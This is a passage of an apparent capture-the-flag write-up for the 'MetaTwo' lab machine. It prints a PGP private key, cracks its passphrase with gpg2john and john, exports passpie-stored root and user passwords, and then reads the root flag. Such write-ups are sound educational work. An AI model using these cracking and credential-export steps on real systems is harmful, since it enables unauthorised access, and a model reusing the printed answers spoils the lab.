F2mStGpiqEOOvVmjHxHAduJpIgpcF8z18AosOswa8ryKg3CS2xQGkK84UliwuPUh
S8wCQQxveke5/IjbgE6GQOlzhpMUwzih7+15hEJVFdNZnbEC9K/ATYC/kbJSrbQM
RfcJUrnjPpDFgF6sXQJuNuPdowc36zjE7oIiD69ixGR5UjhvVy6yFlESuFzrwyeu
TDl0UOR6wikHa7tF/pekX317ZcRbWGOVr3BXYiFPTuXYBiX4+VG1fM5j3DCIho20
oFbEfVwnsTP6xxG2sJw48Fd+mKSMtYLDH004SoiSeQ8kTxNJeLxMiU8yaNX8Mwn4
V9fOIdsfks7Bv8uJP/lnKcteZjqgBnXPN6ESGjG1cbVfDsmVacVYL6bD4zn6ZN/n
WLQzUGFzc3BpZSAoQXV0by1nZW5lcmF0ZWQgYnkgUGFzc3BpZSkgPHBhc3NwaWVA
bG9jYWw+iJAEExEIADgWIQR8Z4anVhvIT1BIZx44d3XDV0XSAwUCYrhX1gIbIwUL
CQgHAgYVCgkICwIEFgIDAQIeAQIXgAAKCRA4d3XDV0XSA0RUAP91ekt2ndlvXNX6
utvl+03LgmilpA5OHqmpRWd24UhVSAD+KiO8l4wV2VOPkXfoGSqe+1DRXanAsoRp
dRqQCcshEQ25AQ0EYrhX1hAEAIQaf8Vj0R+p/jy18CX9Di/Jlxgum4doFHkTtpqR
ZBSuM1xOUhNM58J/SQgXGMthHj3ebng2AvYjdx+wWJYQFGkb5VO+99gmOk28NY25
hhS8iMUu4xycHd3V0/j8q08RfqHUOmkhIU+CWawpORH+/+2hjB+FHF7olq4EzxYg
6L4nAAMFA/4ukPrKvhWaZT2pJGlju4QQvDXQlrASiEHD6maMqBGO5tJqbkp+DJtM
F9UoDa53FBRFEeqclY6kQUxnzz48C5WsOc31fq+6vj/40w9PbrGGBYJaiY/zouO1
FU9d04WCssSi9J5/BiYiRwFqhMRXqvHg9tqUyKLnsq8mwn0Scc5SVYh4BBgRCAAg
FiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4V9YCGwwACgkQOHd1w1dF0gOm5gD9
GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+Po3KGdNgA/04lhPjdN3wrzjU3qmrL
fo6KI+w2uXLaw+bIT1XZurDN
=dqsF
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

We put the private key in a file on our machine to try and crack it.

![SSH Access](./images/Untitled_8.png "SSH Access")

Convert it to a john the ripper format:

```bash
gpg2john hash > hash.john
```

Then run `john` to crack it.

```bash
┌──(dan㉿kali)-[~/HTB/metatwo]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash.john
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)
1g 0:00:00:00 DONE (2022-12-15 23:04) 1.639g/s 275.4p/s 275.4c/s 275.4C/s dolphin..987654
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We get our password: `blink182`

### Exporting Root Credentials and Root Flag

With this password, I exported the root credentials from `passpie`. We are able to confirm the root user's password as `p7qfAZt4_A1xo_0x`.

Upon successful authentication as root, I found the final flag.

```bash
jnelson@meta2:~$ cat newroot.pass
-----BEGIN PGP MESSAGE-----
  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
  lpF0RatbxQGWBks5F3o=
  =uh1B
  -----END PGP MESSAGE-----
```

```bash
jnelson@meta2:~$ passpie export newroot.pass
Passphrase:
jnelson@meta2:~$ cat newroot.pass
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

```bash
jnelson@meta2:~$ su root
Password:
root@meta2:/home/jnelson# id
uid=0(root) gid=0(root) groups=0(root)
root@meta2:/home/jnelson# cd ~
root@meta2:~# ls
restore  root.txt
root@meta2:~# cat root.txt
5acf19dabe402006c6744912d180b243
```

and we’ve got our final flag `5acf19dabe402006c6744912d180b243`.

---

This blog post is part of a series on practical approaches to cybersecurity. Stay tuned for more updates and insights into the fascinating world of ethical hacking and cybersecurity best practices.

Stay safe, and happy hacking!

Note: This blog is for educational purposes only. Attempting unauthorised penetration testing is illegal and punishable by law. Always get explicit permission before performing any penetration testing.
